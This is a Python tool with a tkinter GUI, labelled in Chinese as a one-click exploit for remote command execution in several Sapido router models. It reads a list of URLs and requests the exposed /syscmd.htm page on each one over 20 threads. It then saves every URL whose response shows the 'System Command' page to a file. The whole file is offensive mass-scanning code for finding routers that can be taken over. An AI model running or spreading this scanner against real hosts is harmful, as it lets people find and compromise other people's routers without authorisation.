import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def Sapido_RCE_exp(url):
    poc = r"""/syscmd.htm"""
    url = url + poc
    try:
        res = requests.get(url,verify=False,timeout=3)
        if "System Command" in res.text:
            Sapido_RCE_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
            Sapido_RCE_text.see(END)
            with open ("存在Sapido 多款路由器 远程命令执行漏洞的url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            Sapido_RCE_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
            Sapido_RCE_text.see(END)
    except Exception as err:
        Sapido_RCE_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        Sapido_RCE_text.see(END)
def get_Sapido_RCE_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def Sapido_RCE_gui():
    Sapido_RCE = tk.Tk()
    Sapido_RCE.geometry("910x450")
    Sapido_RCE.title("Sapido 多款路由器 远程命令执行漏洞一把梭")
    Sapido_RCE.resizable(0, 0)
    Sapido_RCE.iconbitmap('logo.ico')
    global Sapido_RCE_text
    Sapido_RCE_text = scrolledtext.ScrolledText(Sapido_RCE,width=123, height=25)
    Sapido_RCE_text.grid(row=0, column=0, padx=10, pady=10)
    Sapido_RCE_text.see(END)
    addrs = get_Sapido_RCE_addr()
    max_thread_num = 20
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(Sapido_RCE_exp, addr)
    Sapido_RCE.mainloop()